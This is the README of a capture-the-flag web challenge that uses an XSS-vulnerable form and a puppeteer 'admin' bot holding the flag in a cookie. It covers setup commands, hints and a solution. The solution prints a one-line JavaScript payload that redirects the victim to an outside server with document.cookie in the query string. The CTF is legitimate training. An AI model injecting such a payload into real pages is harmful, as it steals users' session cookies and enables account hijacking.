# CTF-cookie-monster
A CTF challenge inspired by a challenge from Google CTF beginners quest.

# Setting up the challenge locally

### Challenge:
```
npm i
node index.js
```

### Server:
```
node server/server.js
```

# Details
this challenge uses [puppeteer](https://pptr.dev/) so it will download a version of chromium.

the server is in it's own folder with a `package.json`, file incase you want
to run the server outside of the challenge folder.

A tool like [ngrok](https://ngrok.com/) will be needed to use the provided server if you decide to host
the challenge outide of the network.

# Hints & solution

<details>
	<summary>Hints</summary>

	* XSS
	* It's not going to run itself
	* The admin needs redirecting
</details>

<details>
	<summary>Solution</summary>

	When the user submits the form, an "admin" will check the page.
	The "admin" has the flag stored as a cookie.
	The form has no sanitisation and is vulnerable to XSS

	The code is a self executing function that redirects the admin to
	the server and appends the admins cookies to the query string.
	The server can then log the cookie containing the flag to the console.

	
	(()=>{location.href="http://server-domain/?flag=" + document.cookie})()
	
</details>
